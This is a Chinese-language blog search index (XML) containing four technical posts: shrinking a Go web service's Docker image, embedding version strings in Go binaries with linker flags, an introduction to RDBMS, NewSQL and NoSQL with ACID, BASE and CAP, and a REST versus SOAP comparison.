<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[构建Golang程序最小Docker镜像]]></title>
    <url>%2F2017%2F11%2F20%2Fgolang-mini-docker-image%2F</url>
    <content type="text"><![CDATA[我们知道构建一个Docker镜像的时候往往需要引入一些程序依赖的东西，最常见的就是引入一个基础操作系统镜像，但这样往往会使得编译出来的镜像特别大。就拿Python来说, 之前build的镜像一般都大于600M, 如果这个项目是内部项目, 其实问题不大, 因为内网一般也会搭建镜像仓库, 内网数据也快, 但是如果是开源项目, 镜像过大就是个问题。对拉取者带宽要求较高, 而Docker hub的速度大家也都知道, 当然如果你使用镜像加速体验会好很多。但是如果能做到把镜像变小, 做到几M, 几十M那么对于你项目的使用者来说体验会好很多. 因为Go是静态编译语言, 可以做到0依赖, 因此可以构建很小的程序镜像, 但是其实还是有些小插曲, 这也就是这篇文章出现的原因. 程序样例这里以一个简单的hello world的WEB API程序为例:1234567891011121314151617181920212223package mainimport ( "log" "net/http")// greeter hello world examplefunc greeter(w http.ResponseWriter, r *http.Request) &#123; w.Write([]byte("hello world!")) w.WriteHeader(http.StatusOK) return&#125;func main() &#123; http.HandleFunc("/", greeter) addr := "0.0.0.0:8080" log.Printf("start service at: %s ... \n", addr) err := http.ListenAndServe(addr, nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125; 最终会把这个程序打包成一个最小的docker镜像进行发布, 让我们看看这样一个镜像build出来过后到底有多大。 编译时的问题编译时的主要问题就是如果将Golang程序编译成一个真正没有依赖的二进制程序, 也许有人会问Go本身不就是静态编译吗？这里就需要聊聊Golang里面CGO了。 关于-installsuffix cgo参数Go1.5版本之前，Go里面的一些库函数是用C实现的(网络方面的居多), 也就是CGO。如果你的代码中使用了这些C实现的库函数，那你就要加上-installsuffix cgo这个参数，让它编译的时候去CGO里面找，否则编译时会报错。但是Go1.5版本开始实现了自举，所有的标准库都是用Go代码实现，就不存在这个问题了。所以，如果你的Go版本是1.5之前的，最好加上这个参数，当然如果你的代码中没用使用C实现的库，那不加也不会报错。如果你的Go是1.5及之后的版本，就不需要再加这个参数了。 关于CGO_ENABLED=0参数CGO_ENABLED=0表示静态编译cgo, 不会link系统上的一些动态链接库, 如果想要编译的二进制包正在无依赖, 这需要禁用CGO 有了上面2点, 我们一般会这样build我们的程序:1234# 如果Golang&lt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -installsuffix cgo -o app .# 如果Golang&gt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -o app . 12maojun@maojun-mbp $ du -sh app5.8M app 这样我们就编译好了一个0依赖的二进制包, 打出来的包5.8M, 接下来我们将基于它制造docker镜像。 如何选择镜像的Base依赖在选择我们打包好的二进制包的运行依赖时, 我一般会有这3种考虑: scratch: 它是一个特殊的镜像, 因为它是一个空镜像。但是它却是非常重要。我们知道Dockerfile文件必须以FROM开头，但如果我们的镜像真的是不依赖任何其他东西的时候，我们就可以FROM scratch。在Docker 1.5.0之后，FROM scratch已经变成一个空操作(no-op)，也就是说它不会再单独占一层了, 当然依赖这层的大小也就为0了, 因此基于此可以构建最小镜像。 alpine: Alpine Linux是一个社区开发的面向安全应用的轻量级Linux发行版, 适合用来做Docker镜像、路由器、防火墙、VPNs、VoIP 盒子 以及服务器的操作系统，基于uClibc和Busybox, 大小只有3.97M。 ubuntu: 这个不用多做介绍了, 如果你信不过alpine这也算一个不错的选择, ubuntu16.04的镜像大小为128M。 我们选择alpine作为base依赖, 因为它足够小, 而且是一个linux, 有shell环境, 以备有时需要进入容器。完整的Dockerfile如下:12345FROM alpine:latestADD app /CMD ["/app"] 最终镜像大小基于刚才写好的dockerfile进行build:123456789101112 maojun@maojun-mbp $ docker build -t app:v0.0.1 .Sending build context to Docker daemon 6.094MBStep 1/3 : FROM alpine:latest ---&gt; 053cde6e8953Step 2/3 : ADD app / ---&gt; 765750f573f1Step 3/3 : CMD /app ---&gt; Running in cb62cfd2ad1e ---&gt; 188a3189d4f8Removing intermediate container cb62cfd2ad1eSuccessfully built 188a3189d4f8Successfully tagged app:v0.0.1 build出来的image大小:1app v0.0.1 188a3189d4f8 2 minutes ago 10.1MB 最后我们测试下build的镜像是否可以正常使用:1234567 maojun@maojun-mbp $ docker run -itd -p 8080:8080 app:v0.0.19fe96a7868679f8be4e34905755dcd93343a70b9a0424791de2482647e69b2d8 maojun@maojun-mbp $ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9fe96a786867 app:v0.0.1 "/app" 4 seconds ago Up 2 seconds 0.0.0.0:8080-&gt;8080/tcp hungry_kilby maojun@maojun-mbp $ curl localhost:8080hello world!% 最终镜像大小: 10.1M, 并且带有shell, 如果你使用scratch构建估计只有6M多点, 但是实用性可能会有所降低。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang程序版本管理]]></title>
    <url>%2F2017%2F11%2F19%2Fgolang-cli-version%2F</url>
    <content type="text"><![CDATA[项目在完成后往往都需要版本化, 而Golang项目往往交付的是编译过后的二进制包, 如何通过二进制包知道项目的版本, 就像docker的version命令一样楠? 为什么需要版本管理版本管理主要用于对运行程序的版本追踪,从而可以管理线上服务的运行版本,避免各个版本的服务程序混淆.这里通常的做法为在程序中埋入版本标志,同时该版本号会对应到git上的tag或release版本.从而对线上服务更改有一个更全面的信息说明。 比如docker的版本信息:123456789 maojun@maojun-mbp $ docker versionClient: Version: 17.09.0-ce API version: 1.32 Go version: go1.8.3 Git commit: afdb6d4 Built: Tue Sep 26 22:40:09 2017 OS/Arch: darwin/amd64... GUN风格版本命名方式和规则这里将介绍基于GNU风格的一种版本命名方式, 这也是当今主流的版本命名方式, 很多开源项目的版本命名都遵循此风格。GUN风格版本命名风格:123Major_Version_Number.Minor_Version_Number[.Revision_Number[.Build_Number]] 主版本号.子版本号[.修正版本号[.编译版本号]]示例 : 1.2.1, 2.0, 5.0.0.build-13124 Major: 具有相同名称但不同主版本号的程序集不可互换。例如，这适用于对产品的大量重写，这些重写使得无法实现向后兼容性。 Minor: 如果两个程序集的名称和主版本号相同，而次版本号不同，这指示显著增强，但照顾到了向后兼容性。例如，这适用于产品的修正版或完全向后兼容的新版本。 Revision: 名称、主版本号和次版本号都相同但修订号不同的程序集应是完全可互换的。这适用于修复以前发布的程序集中的安全漏洞。 Build: 内部版本号的不同表示对相同源所作的重新编译。这适合于更改处理器、平台或编译器的情况。 版本号的变化一般遵循如下规则: 项目初版本 : 版本号可以为 0.1 或 0.1.0, 也可以为 1.0 或 1.0.0. 修正版本号增加: 当项目在进行了局部修改或 bug 修正时，主版本号和子版本号都不变,修正版本号加1. 子版本号增加 : 当项目在原有的基础上增加了部分功能时，主版本号不变，子版本号加 1，修正版本号复位为 0，因而可以被忽略掉. 主版本号增加 : 当项目在进行了重大修改或局部修正累积较多，而导致项目整体发生全局变化时. 编译版本号变化 : 编译版本号一般是编译器在编译过程中自动生成的，我们只定义其格式，并不进行人为控制 如何埋入版本信息写C/C++代码时，可以在代码中预定义一些版本宏定义，然后再编译时从外部传入数据作为版本号, golang代码不支持宏定义, 但是go build时提供了一个与之相似的功能参数:12-ldflags 'flag list' arguments to pass on each go tool link invocation. 然后查看go tool link的相关文档:1234-X importpath.name=value Set the value of the string variable in importpath named name to value. Note that before Go 1.5 this option took two separate arguments. Now it takes one argument split on the first = sign. 按照文档中的说明应该是在build时，通过-ldflags设定linker的参数。 然后再通过linker的-X来修改指定路径下面的变量值12345678910111213package main import ( "fmt") var ( VERSION) func main() &#123; fmt.Printf("Version:[%s]\n", VERSION)&#125; 编译时传入变量:123$ go build -ldflags "-X main.VERSION=v1.0.0-alpha1" main.go$ ./mainVersion:[v1.0.0-alpha1] 最终样例如果我们直接在项目入口文件处埋入版本信息, 对项目入口侵入太大, 因此你会看到一些好的开源项目下都有一个专门的version包, 由它来负责接收埋入的版本信息。 最终示例请参考: Golang程序版本管理代码示例123456 maojun@maojun-mbp $ ./version-example -vVersion : v0.0.1-alpha.0Build Time: 2017-11-19 23:28:12Git Branch: masterGit Commit: 83de09af3f96007726edd5b308ed989476b9f358Go Version: go1.9 linux/amd64]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库分类以及NoSQL介绍]]></title>
    <url>%2F2017%2F11%2F05%2Fmongodb-introduce%2F</url>
    <content type="text"><![CDATA[由于项目需要存储一些无结构的数据, 这些数据主要以文本为主, 同时还需支持一些文本分析, 咋一听似乎ES是一个不错的选择, 但是这些无结构的数据同时也需要被管理, 也就是这些数据可能经常变更, 衡量再三, 最后还是选择了Mongo, 毕竟现阶段是以数据的存储和管理为主, 分析并没有那么强的需求。整篇文章以大数据存储问题为引, 一步步引出NoSQL领域文档数据的代表MongoDB。 大数据存储问题E.F.Codd在1970年首次提出了数据库系统的关系模型，从此开创了数据库关系方法和关系数据理论的研究，为数据库技术奠定了理论基础，数据库技术也开始蓬勃发展。而随着几大数据库厂商陆续发布的商业数据库管理系统几乎都支持关系数据模型，数据库技术逐渐统一到以关系型数据库为主导。关系模型有扎实的数学理论做基础, 并且经过长时间的实践, 使得其在数据存储与管理领域占据统治地位。 2001年后，互联网技术迅速发展，数据量迅速膨胀并并大，人类逐步进入大数据时代。大数据给传统的数据管理方式带来了严峻的挑战，关系型数据库在容量，性能，成本等多方面都难以满足大数据管理的需求。NoSQL数据库通过折中关系型数据库严格的数据一致性管理，在可扩展性、模型灵活性、经济性和访问性等方面获得了很大的优势，可以更好地适应大数据应用的需求，成为大数据时代最重要的数据管理技术。 围绕大数据的存储问题, 我们依次讨论下数据库的几大分类: RDBMS, NewSQL, NoSQL。 RDBMS在现代的计算系统上每天网络上都会产生庞大的数据量。这些数据有很大一部分是由关系数据库管理系统(RDMBSs)来处理。 1970年 E.F.Codd’s提出的关系模型的论文 “A relational model of data for large shared data banks”，这使得数据建模和应用程序编程更加简单。通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。 什么是RDBMS？ RDBMS全称是Relational Database Management System, 及关系型数据管理系统, 他采用关系模型来存储数据,关系模型是把复杂的数据结构归结为简单的二元关系(即二维表格形式), 在关系型数据库中，对数据的操作几乎全部建立在一个或多个关系表格上，通过对这些关联的表格分类、合并、连接或选取等运算来实现数据库的管理。 关系型数据的特点(ACID) 关系型数据库遵循ACID规则, 也就是我们常说的事物模型(transaction), 事物这个概念和现实世界中的交易很类似, 它有如下4个特性: A(Atomicity)原子性很容易理解，也就是说事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。比如银行转账，从A账户转100元至B账户，分为两个步骤：1）从A账户取100元；2）存入100元至B账户。这两步要么一起完成，要么一起不完成，如果只完成第一步，第二步失败，钱会莫名其妙少了100元。 C(Consistency)一致性也比较容易理解，也就是说数据库要一直处于一致的状态，事务的运行不会改变数据库原本的一致性约束。例如现有完整性约束a+b=10，如果一个事务改变了a，那么必须得改变b，使得事务结束后依然满足a+b=10，否则事务失败。 I(Isolation)所谓的独立性是指并发的事务之间不会互相影响，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。比如现有有个交易是从A账户转100元至B账户，在这个交易还未完成的情况下，如果此时B查询自己的账户，是看不到新增加的100元的。 D(Durability)持久性是指一旦事务提交后，它所做的修改将会永久的保存在数据库上，即使出现宕机也不会丢失。比如A账户收到了100元到账, 只要到账这个事物完成, 数据就已经到数据库里面了, 即使此时宕机对A用户的资产也没有影响。 典型的产品 关系型数据库诞生40多年了，从理论产生发展到现实产品, RDBMS很多产品应该都是耳熟能详的: Oracle MySQL PostgreSQL SQLServer 大数据存储时面临的问题 关系型数据库严格ACID原则, 因此在扩展性上表现不是特别好, 面对大规模的数据时, 在读和写上面会出现严重瓶颈。想要提升其性能, 往往需要从业务层进行处理, 进行数据的Sharding。sharding有2个维度: 水平切分和垂直切分: 水平切分: 根据表中的数据的逻辑关系，将同一张表的数据，按照某种条件切分到不同的数据库主机上 垂直切分: 按照不同的表或者schema，来切分到不同的数据库主机上 切片(sharding)会增加整个系统的复杂性，而且切片本身也是一个很复杂的过程，与应用本身有这密切的关系，所以对于不但增大的数据而言，切片并不能从根本上解决大数据存储问题。 NewSQL传统的关系型数据想要做到高扩展, 高性能, 高可靠性是很复杂的, 但是当你的确想要一种这种样的数据库时, NewSQL可能是你一种不错的选择。 什么是NewSQL？ 这是一个中间产物, 是一种完全不同的数据库架构, NewSQL术语最早在2011年由Matthew Aslett创造, NewSQL的设计立足于传统的关系型数据库，但是同时也引进一些新技术，从而达到可扩展和高性能的目的, 而缺点是没有提供强一致性, 它们不可以被使用在强一致性环境下。NewSQL具有NoSQL的海量数据存储管理能力,同时还支持传统数据库的ACID和SQL能力(单个节点上的ACID能力), 但是在现实使用中还没普及开来, 还没被大规模使用。 NewSQL的特点 NewSQL具体和RDBMS一样的单个节点上的ACID能力, 同时又具有NoSQL一样的很强的扩展能力(它在整个集群上遵循BASE规则, 关于BASE在后面NoSQL中再做介绍)。 典型的NewSQL产品 我迄今也没有使用过NewSQL产品, 以下是我所知的关于NewSQL的经典产品: Google spanner: Google的全球级的分布式数据库(Globally-Distributed Database) CockroachDB: 参考Goole spanner实现的开源版 如何解决大数据存储问题？ NewSQL基于NoSQL的BASE原则, 构建可以横向扩展的分布式系统来解决大数据的存储和管理问题。 NoSQL今天我们可以通过第三方平台(如：Google,Facebook等), 可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了, NoSQL数据库的发展也却能很好的处理这些大的数据。 什么是NoSQL？ NoSQL(NoSQL = Not Only SQL)，意即“不仅仅是SQL”，是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入 NoSQL的特点(BASE) BASE的全称是Basically Available, Soft-state, Eventually Consistent。 由Eric Brewer定义。ACID强调强一致性(CAP中的C), 而BASE则强调基本可用性(CAP中的A），在BASE思想的扩展下，就出现了NoSQL。BASE是NoSQL数据库通常对可用性及一致性的弱要求原则: Basically Availble: 基本可用 Soft-state: 软状态/柔性事务。 “Soft state” 可以理解为”无连接”的, 而 “Hard state” 是”面向连接”的 Eventual Consistency: 最终一致性 最终一致性， 也是是 ACID 的最终目的。 BASE是相对ACID而言的, 下面是对比表: ACID BASE A原子性(Atomicity) 基本可用(Basically Available) 一致性(Consistency) 软状态/柔性事务(Soft state) 隔离性(Isolation) 最终一致性 (Eventual consistency) 持久性 (Durable) 支持 典型的NoSQL产品 NoSQL是实现方式各不相同，下面主要介绍 主流的NoSQL流派, 想要了解更具体的信息请点击关于所有NoSQL介绍的一个网站: 列式数据模型数据模型： 看到也是表, 但是不支持链接查询, 因为数据存储以列为单位(column), 而关系数据库是以行为存储单位的应用场景： 在分布式文件系统之上提供支持随机读写的分布式数据存储典型产品： Hbase、 Hypertable、 Bigtable、 Cassandra优点： 快速查询、 高扩展性、易于实现分布式扩展 文档数据模型 ：数据模型： 介于键值存储kv)和关系型存储(row),每一行数据组织为一个文档, 以文档为存储单位应用场景： 非强事物需求的web应用典型产品： MongoDB、 ElasticSearch(弹性搜索，存储web日志)优点： 数据模型无需事先定义 键值数据模型 ：数据模型： 模型简单, 易于实现, 操作简单(get set del)应用场景： 内容缓存, 用于大量并行数据访问, 高负载场景应用产品： DynamoDB, Riak, Redis优点： hash的优点， 查询迅速 图式数据模型 ：数据模型： 图式结构应用场景： 社交网络、 推荐系统、 关系图谱典型产品： Neo4J优点： 适用于图式技术场景 如何解决大数据存储问题？ 通过分布式解决 RDBMS vs NoSQLRDBMS的特点: 高度组织化结构化数据 结构化查询语言 数据和关系都存储在单独的表中。 数据操纵语言，数据定义语言 严格的一致性 基于事务 NoSQL的特点: 代表着不仅仅是SQL 没有声明性查询语言 没有预定义的模式, 架构的灵活性，支持半结构化数据 键值对存储，列存储，文档存储，图形数据库 最终一致性，而非ACID属性 非结构化和不可预知的数据 分布式计算, CAP定理 高性能，高可用性和可伸缩性, 高水平扩展能力和低成本的低端硬件集群 功能相对简单, 没有统一的查询语言, 有限的查询功能 最终一致是不直观的程序 数据模型对于数据本身而言, 我们往往将其分为结构化数据, 半结构化数据, 以及非结构化数据, 但是对于储存时数据的组织我们才称其为数据模型, 常见的数据模型有: 关系模型, 文档模型, 健值模型, 以及列式模式。 用户侧数据随着网络技术的发展，特别是Internet和Intranet技术的飞快发展，使得非结构化数据的数量日趋增大。这时，主要用于管理结构化数据的关系数据库的局限性暴露地越来越明显。因而，数据库技术相应地进入了“后关系数据库时代”，发展进入基于网络应用的非结构化数据库时代。 结构化数据(structured data) 结构化数据, 即行数据,存储在数据库里,可以用二维表结构来逻辑表达实现的数据。结构化数据, 先知结构, 再有数据。 我们根据数据的结构预先建立好二维表, 等数据来的时候, 填入即可。因此结构化的数据往往是可建模, 标准化的数据, 结构化的数据很方便程序使用, 因为结构已知。 结构化数据最大的问题, 就当数据的结构发生变化时, 我们需要调整数据的结构, 一般就意味着数据库表结构的需要变动。这使得数据在存储时有严格的要求(需要定义schema)。结构化数据: 可以被提前建模的数据(定义schema) 半结构化数据(semi-structured data) 所谓半结构化数据，就是介于完全结构化数据(如关系型数据库、面向对象数据库中的数据)和完全无结构的数据(如声音、图像文件等)之间的数据，HTML文档就属于半结构化数据。它一般是自描述的，数据的结构和内容混在一起，没有明显的区分。所以对于半结构化的数据, 数据的结构要等数据获得后才知道, 也就是先有数据, 后知结构。整个互联网上这类数据是很多的, 因为html就是半结构化的数据。 相对于结构化的数据, 半结构化数据无需定义数据的结构(schema free), 使得其在存储上表现出强大的灵活性。半结构化数据: HTML, JSON, XML 非结构化数据(unstructured data) 相对于结构化数据而言，不方便用数据库二维逻辑表来表现的数据即称为非结构化数据。非结构化数据库是指其字段长度可变，并且每个字段的记录又可以由可重复或不可重复的子字段构成的数据库，用它不仅可以处理结构化数据(如数字、符号等信息), 而且更适合处理非结构化数据（全文文本、图象、声音、影视、超媒体等信息)。 非结构化WEB数据库主要是针对非结构化数据而产生的，与以往流行的关系数据库相比，其最大区别在于它突破了关系数据库结构定义不易改变和数据定长的限制，支持重复字段、子字段以及变长字段并实现了对变长数据和重复字段进行处理和数据项的变长存储管理，在处理连续信息（包括全文信息）和非结构化信息（包括各种多媒体信息）中有着传统关系型数据库所无法比拟的优势。非结构化数据: 所有格式的办公文档、文本、图片、XML、HTML、各类报表、图像和音频/视频信息等等。 存储时数据数据存储模型值数据存储时如何组织 关系模型关系模型: 新定义列, 然后通过行的方式对数据进行存储, 以二维表来表示实体与实体之间的联系，在数据建模时需要对数据对象进行拆分，再将各自的信息存到对应的表里，在需要时再将各个表连接起来。 在关系模型当中，多个表中的不同记录经常“交错连接”，一些数据会被多条记录共享。这样的好处就是减少了重复数据的出现，但是这样不好的地方就是一旦其中某一条链接的记录发生改变，那么与其相关的记录和表都会被锁住以防止非一致性的出现。 ACID事务在关系型数据库中是很复杂的，因为数据会扩散。即便是单一条记录，这复杂的共享数据内部关系网的存在，也使得关系型数据在多个服务器之间的传递变得复杂而缓慢，同时让读和写操作的性能变差。当存储空间昂贵又稀少时，折中的权衡方案是很必要的。然而，如今存储空间的价格跟40年前相比已经大大的下降了，很多时候计算折中方案已经完全没有必要。使用更多的存储空间来换取更好的操作性能，或者是将工作负载分配到多台机器上，这才是如今应用上更好的解决方案。 文档模型文档数据: 将一个数据记录(record或者row)作为单位进行存储, 无需定义行。也可以认为一个文档就是关系数据库的一行。 使用“文档”这个词似乎让人觉得奇怪，但是其实”文档型数据模型”真的和传统意义的文字”文档”没有什么关系。他不是书、信或者文章，这里说的”文档”其实是一个数据记录, 这个记录能够对包含的数据类型和内容进行“自我描述”。XML文档、HTML文档和JSON 文档就属于这一类, 因此我们可以认为所有半结构化的数据都属于文档数据, 而现在主要的文档数据库还是以Json作为文档为主.可以看到，数据是不规则的，每一条记录包含了所有的有关该记录的信息而没有任何外部的引用, 这条记录就是“自包含”的。这就使得记录很容易完全移动到其他服务器, 因为这条记录的所有信息都包含在里面了, 不需要考虑还有信息在别的表没有一起迁移走。同时，因为在移动过程中，只有被移动的那一条记录需要操作而不像关系型中每个有联系的表都需要锁住来保证一致性，这样一来ACID的保证就会变得更快速, 读写的速度也会有很大的提升。 健值模型健值模型: 它的数据按照键值对的形式进行组织,索引和存储。KV存储非常适合不涉及过多数据关系业务关系的业务数据，同时能有效减少读写磁盘的次数，比SQL数据库存储拥有更好的读写性能。 列式模型列式存储: 以列相关存储架构进行数据存储。列式存储以流的方式在列中存储所有的数据，主要适合与批量数据处理和即席查询。 由于查询需要读取的blocks少, 所以查询快, 因为同一类型的列存储在一起, 所以数据压缩比高, Load快。 它简化数据建模的复杂性。但是插入更新慢，不太适合数据老是变化，它是按列存储的。 列式存储很适合做数据仓库，它不适合OLTP。 CAP定理在计算机科学中, CAP定理(CAP theorem), 又被称作布鲁尔定理(Brewer&#39;s theorem), 它指出对于一个分布式计算系统来说，不可能同时满足以下三点: 一致性(Consistency) (所有节点在同一时间具有相同的数据) 可用性(Availability) (保证每个请求不管成功或者失败都有响应) 分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作) CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。因此，根据CAP原理将NoSQL数据库分成了满足CA原则、满足CP原则和满足AP原则三 大类： CA 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。 CP 满足一致性，分区容忍性的系统，通常性能不是特别高。 AP 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。 定理: 任何分布式系统最多只能同时时满足3点(Consistency, Availability, Partition tolerance)中的2点, 同时满足3点的分布式系统是不存在的忠告：架构师不要将精力浪费在如何设计能满足三者的完美分布式系统，而是应该进行取舍。 CAP与数据库RDBMS满足的是ACID规则, 而ACID规则满足的就是CAP里面的CA, 因此扩展性不强.NewSQL/NoSQL满足的是BASE规则, 而BASE规则就是降低一致性或者可用性来提升系统性能, 就是CAP里面的CP/AP 总结在理解了上面所有的概念过后, 就能看懂这张CAP的图了: 参考MongoDB Architecture官方中文介绍elasticsearch(lucene)可以代替NoSQL(mongodb)吗？]]></content>
      <categories>
        <category>数据库</category>
        <category>文档数据库</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对比RESTful与SOAP，深入理解RESTful]]></title>
    <url>%2F2017%2F10%2F03%2Frestful-vs-soap%2F</url>
    <content type="text"><![CDATA[在文章开始前请思考如下问题: REST是啥? SOAP是啥？为什么会产生他们？以及他们都有哪些特点？他们到底有哪些不同？我们什么时候选择REST，什么时候选择SOAP. 在这里我们通过对比他们来解答前面提出的问题. 诞生在十多年前 有2种很重要构建web service的方法: RESTful 和 SOAP, SOAP的出现约为比RESTful早一些，在开始之初他们并没有分化，仍然共存来解决不同的需求。但是现在RESTful盛行，SOAP日渐没落，所以我们来了解下他们的前世今生. RESTful出生在学术界,有着拥抱开放网络的哲学,而SOAP是大型软件公司为了解决企业市场的需要而产出的。虽然现在REST盛行，但是SOAP的确也有他的优点，所有我们需要比较这两个协议，做正确的取舍. RESTful简介REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的。它是“Representational State Transfer”的缩写。他这次论文的主题是探讨几种基于网络的软件设计架构和风格， 而REST被具体描述是在他论文的第5章。在这个章节中，他是这样总结REST的: provides a set of architectural constraints that, when applied as a whole, emphasizes scalability of component interactions, generality of interfaces, independent deployment of components, and intermediary components to reduce interaction latency, enforce security, and encapsulate legacy systems. 它提供了一组体系约束，具体有这么几点: 整体关联性 强调组件交互的可伸缩性 组件的独立部署 一般性的接口 使用中间件来减少交换延迟 执行安全 所以,REST可以被描述为一种构建Web服务所应该遵循的一组特定约束(provider和customer之间的): client 端和server端的 关注点的分离: client不用关注 数据的存储， 而server端不必关注用户界面。使得client 和 server 解耦，从而取得高扩展性 客户端和服务器之间的通信必须无状态: 服务器不应该存储任何 和clients之间交互的上下文信息, 除了用于维护认证的会话信息。 客户应该能够缓存响应: 所有服务器响应应该包含足够的缓存相关的信息。客户端可以依靠这些信息决定是否适合缓存响应。 连接可以发生在多个通信层: 服务端不应该区分 客户端 是否直接连接server，还是通过中间代理来连接server Fielding是一个非常重要的人，他是HTTP协议（1.0版和1.1版）的主要设计者、Apache服务器软件的作者之一、Apache基金会的第一任主席。所以，他的这篇论文一经发表，就引起了关注，并且立即对互联网开发产生了深远的影响。 总体来说REST就是web的一种抽象，REST应该允许任何customer 以同一种方式与API进行交互， 而不需要知道其后面的工作原理。 SOAP简介SOAP, 是“Simple Object Access Protocol”的缩写, 是1998年一群人和微软合作而产生的。其中的一个人叫戴夫·维纳,他是XML-RPC(一种使用xml作为 标准的消息载体 的 远程过程调用)的创造者, 也正是这项创造导致的SOAP的产生，尽管被微软,IBM和其他公司支持，但是SOAP直到2003年才被W3C正式承认。 使用SOAP Web服务符合一组特征，使分布式对象之间的通信成为了可能: 协议是可扩展的: 扩展的基本功能可以构建和使用而不影响主要特征 消息内容应该独立于传输机制: SOAP不仅可以通过HTTP传输消息内容，而且其他传输协议也支持比如：SMTP。SMTP被用来提供客户端和服务器之间的异步通信。 底层编程模型解耦: 在逻辑上 SOAP的客户端和服务端的开发时完全独立的。 SAOP在他刚出世的前几年，非常盛行，但是随后一直走下坡路，但是SAOP现在仍然别一些企业级的环境使用着，这是因为在企业级的需求里面,不同服务之间的通信需要遵循一套规则和约束。正是因为它遵循对象、规则和约束,所以SOAP是一个比REST更严格的协议。 SOAP在较大的组织中赢得了支持,主要原因是当时微软的支持，以及市场由微软主导。Windows Communication Foundation(WCF),以微软平台作为核心开发, 直到今天仍然支持SOAP， 而其他方式实现的SAOP的客户端和服务端框架有PHP Zend Framework和Apache CXF REST vs SOAP 设计哲学SOAP主要是提供了一种远程访问和操作对象的方式，而REST则关注资源可以被执行的操作。由此可见SAOP更关注功能，而REST更关注资源，这主要与他们的设计哲学和出生有关(前面已经提及), 正是由于这些区别，REST主要被用来设计暴露于互联网的公网API，而由于REST继承了HTTP的操作，更使得它成为构建开放的WEB API的不二之选。 互联网公司支持RESTful很流行的一个主要原因是互联网巨头的使用，以及这些互联网巨头的鼓励和推荐 带宽消耗在你不需要将一组对象全映射给客户端的场景中， REST永远都要优于SOAP， 而大多数情况下， 完全没有必要将服务器端的一组对象全映射给客户端。而对象的来回映射是极具消耗带宽的，这也是为啥说SOAP比较重的原因所在。 所以尽量避免使用SOAP， 特别是当你的带宽资源非常珍贵的情形下，比如移动app 易用性这是最重要的原因, REST比SOAP简单, 学习和使用RESTful API的代价极低，这使得开发RESTfulAPI的时间上比SOAP短。RESTful通过HTTP的方法来操作资源，通过json来交换数据， 无论是HTTP协议上的使用简单(request url and get response), 还是数据交换格式Json的流行，当然Json的流行主要是因为javascript, 都使得REST比SOAP更易于被人们接收和使用。 敏捷性由于REST轻约束(这个主要是无状态的设计)， 而SOAP重约束， 使得REST更加灵活，当WEB API有变化时 企业可以快速的适用。 深入RESTful在对RESTful的前世今生， 以及如何PK掉SOAP的 了解下， RESTful的具体概念 也就比较好理解了， 如果更深入了解RESTful的概念，可见参考后面Fielding的博士生论文第5章，文章最后有连接。 名称名称往往都非常重要, 因为它是对这个事物的高度抽象,比如Docker, 他的英文意识是码头的搬运工，而Docker真正的用途是软件的搬运工，所以是不是很有意思。Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer的缩写。这个词组的翻译是”表现层状态转化”。因此要理解RESTful到底是一种啥样的互联网软件设计风格，理解好Representational State Transfer 这组单词是第一步。 这单词中包含了那些信息喃? REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”(Resources)的”表现层”。因此就有3个要素：资源、表现、转换. Resource(资源)所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI(统一资源定位符)指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。 人们往往容易把RUI和URL搞混，实际上他们的确是指同一种事物(资源), 只是站的角度不同, 而叫法不同而已: 站在客户端，我们叫访问资源的路径叫URL, 站在服务器 我们定义资源的路径叫 RUI 而整个互联网 就是由这些资源组合而成的. Representational(表现层)“资源”是一种信息实体, 它可以有多种外在表现形式. 我们把”资源”具体呈现出来的形式, 叫做它的表现层(Representation).比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。 URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式, 属于表现层范畴，而URI应该只代表资源的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对表现层的描述。 State Transfer(状态转换)访问一个网站, 就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。 互联网通信协议HTTP协议, 是一个无状态协议。这意味着, 所有的状态都保存在服务器端。因此, 如果客户端想要操作服务器, 必须通过某种手段让服务器端发生状态转化(State Transfer). 而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。 